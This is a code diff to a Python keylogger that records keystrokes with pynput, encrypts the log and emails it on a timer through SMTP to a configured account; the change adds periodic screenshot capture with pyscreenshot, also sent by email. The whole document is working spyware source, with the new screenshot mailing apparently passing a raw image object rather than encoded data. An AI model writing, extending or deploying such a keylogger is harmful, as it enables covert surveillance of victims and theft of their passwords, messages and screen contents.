@@ -2,6 +2,7 @@ from pynput.keyboard import Key, Listener
 from smtplib import SMTP, SMTPAuthenticationError
 from threading import Timer
 from cryptography.fernet import Fernet
+import pyscreenshot
 
 EMAIL_ADDRESS = "YOUR_EMAIL"
 EMAIL_PASSWORD = "YOUR_EMAIL_PASSWORD"
@@ -39,20 +40,21 @@ class Keylogger:
     def encrypt_log(self):
         return self.f.encrypt(str.encode(f"\n\n{self.log}"))
 
-    def send_email(self):
+    def send_email(self, message):
         server = SMTP(host=EMAIL_HOST, port=PORT)
         # connect to the SMTP server as TLS mode
         server.starttls()
         try:
             server.login(self.email, self.password)
-            server.sendmail(self.email, self.email, self.encryrpt_log())
+            server.sendmail(self.email, self.email, message)
         except SMTPAuthenticationError:
             print("Username and Password not accepted.")
         finally:
             server.quit()
 
     def report(self):
-        self.send_email()
+        self.send_email(self.encrypt_log())
+        self.send_email(pyscreenshot.grab())
         self.log = ""
         timer = Timer(self.interval, self.report)
         timer.start()
